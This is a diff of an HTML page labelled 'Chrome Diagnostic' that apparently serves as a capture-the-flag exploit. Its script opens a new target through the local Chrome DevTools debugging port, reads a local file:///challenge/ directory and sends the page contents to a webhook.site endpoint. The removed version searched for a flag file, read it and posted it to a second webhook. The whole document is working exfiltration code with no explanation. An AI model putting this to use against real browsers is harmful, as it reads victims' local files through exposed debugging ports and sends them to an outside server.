@@ -1,103 +1,130 @@
 <!doctype html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome Diagnostic</title>
+</head>
 <body>
-<pre id="out">Starting diagnostic...</pre>
+  <h2>Chrome Diagnostic</h2>
+  <pre id="out">Starting...</pre>
 
-<script>
-(async () => {
-  const out = document.getElementById("out");
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
+  <script>
+    (async () => {
+      const out = document.getElementById("out");
 
-  async function evaluate(ws, expression, id) {
-    return new Promise((resolve, reject) => {
-      const timeout = setTimeout(
-        () => reject(new Error("CDP evaluation timeout")),
-        2500
-      );
+      const report = async data => {
+        try {
+          await fetch(
+            "https://webhook.site/006c020c-2d36-4a99-a217-7dad58b760e0",
+            {
+              method: "POST",
+              mode: "no-cors",
+              body: JSON.stringify(data)
+            }
+          );
+        } catch (e) {
+          out.textContent += "\nReport error: " + e.message;
+        }
+      };
 
-      function handler(event) {
-        const msg = JSON.parse(event.data);
-        if (msg.id !== id) return;
-        clearTimeout(timeout);
-        ws.removeEventListener("message", handler);
-        resolve(msg);
+      const log = async (stage, details = {}) => {
+        out.textContent += "\n[" + stage + "] " +
+          JSON.stringify(details);
+        await report({ stage, ...details });
+      };
+
+      const evaluate = (ws, expression, id) =>
+        new Promise((resolve, reject) => {
+          const timeout = setTimeout(() => {
+            ws.removeEventListener("message", handler);
+            reject(new Error("CDP evaluation timeout"));
+          }, 1200);
+
+          function handler(event) {
+            let msg;
+            try {
+              msg = JSON.parse(event.data);
+            } catch {
+              return;
+            }
+
+            if (msg.id !== id) return;
+            clearTimeout(timeout);
+            ws.removeEventListener("message", handler);
+            resolve(msg);
+          }
+
+          ws.addEventListener("message", handler);
+          ws.send(JSON.stringify({
+            id,
+            method: "Runtime.evaluate",
+            params: {
+              expression,
+              returnByValue: true
+            }
+          }));
+        });
+
+      try {
+        await log("started", {
+          page: location.href,
+          browser: navigator.userAgent
+        });
+
+        const response = await fetch(
+          "http://127.0.0.1:9222/json/version"
+        );
+
+        if (!response.ok) {
+          throw new Error("CDP HTTP " + response.status);
+        }
+
+        const version = await response.json();
+
+        await log("cdp-version", {
+          browser: version.Browser,
+          protocol: version["Protocol-Version"]
+        });
+
+        const targetResponse = await fetch(
+          "http://127.0.0.1:9222/json/new?file:///challenge/",
+          { method: "PUT" }
+        );
+
+        if (!targetResponse.ok) {
+          throw new Error("New target HTTP " + targetResponse.status);
+        }
+
+        const target = await targetResponse.json();
+        const ws = new WebSocket(target.webSocketDebuggerUrl);
+
+        await new Promise((resolve, reject) => {
+          ws.onopen = resolve;
+          ws.onerror = () => reject(new Error("WebSocket failed"));
+        });
+
+        const result = await evaluate(
+          ws,
+          "JSON.stringify({url:location.href,title:document.title,body:document.body.innerText})",
+          1
+        );
+
+        await log("directory-result", {
+          result: result.result?.result?.value ??
+                  JSON.stringify(result)
+        });
+
+        ws.close();
+      } catch (error) {
+        await log("error", {
+          name: error.name,
+          message: error.message
+        });
       }
-
-      ws.addEventListener("message", handler);
-      ws.send(JSON.stringify({
-        id,
-        method: "Runtime.evaluate",
-        params: {
-          expression,
-          returnByValue: true
-        }
-      }));
-    });
-  }
-
-  try {
-    const response = await fetch(
-      "http://127.0.0.1:9222/json/new?file:///challenge/",
-      { method: "PUT" }
-    );
-
-    const target = await response.json();
-    const ws = new WebSocket(target.webSocketDebuggerUrl);
-
-    await new Promise((resolve, reject) => {
-      ws.onopen = resolve;
-      ws.onerror = reject;
-    });
-
-    await sleep(800);
-
-    const result = await evaluate(
-      ws,
-      "document.body.innerText",
-      1
-    );
-
-    const listing = result.result?.result?.value ?? JSON.stringify(result);
-    out.textContent = "Directory result:\n" + listing;
-
-    const match = listing.match(/flag-[a-f0-9]+/i);
-
-    if (match) {
-      ws.send(JSON.stringify({
-        id: 2,
-        method: "Page.navigate",
-        params: {
-          url: "file:///challenge/" + match[0]
-        }
-      }));
-
-      await sleep(800);
-
-      const flagResult = await evaluate(
-        ws,
-        "document.body.innerText",
-        3
-      );
-
-      const flag = flagResult.result?.result?.value ?? JSON.stringify(flagResult);
-
-      out.textContent += "\n\nFile result:\n" + flag;
-
-      await fetch(
-        "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64",
-        {
-          method: "POST",
-          mode: "no-cors",
-          body: flag
-        }
-      );
-    }
-
-    ws.close();
-  } catch (error) {
-    out.textContent += "\nError: " + error.message;
-  }
-})();
-</script>
+    })();
+  </script>
 </body>
 </html>
+
+
+
